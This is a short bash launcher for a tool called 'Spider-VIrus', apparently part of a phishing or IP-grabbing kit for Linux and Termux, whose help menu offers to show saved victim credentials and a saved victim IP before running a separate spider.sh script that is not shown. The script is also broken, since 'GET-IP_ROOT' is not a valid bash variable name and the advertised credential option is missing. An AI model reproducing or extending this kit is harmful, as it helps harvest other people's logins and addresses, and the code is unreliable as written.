

if [[ $(uname -o) == *'Android'* ]];then
	GET-IP_ROOT="/data/data/com.termux/files/usr/opt/Spider-VIrus"
else
	export GET-IP_ROOT="/opt/Spider-VIrus"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Spider-VIrus type \`Spider-VIrus\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo

elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $GET-IP_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $GET-IP_ROOT
	bash ./spider.sh
fi
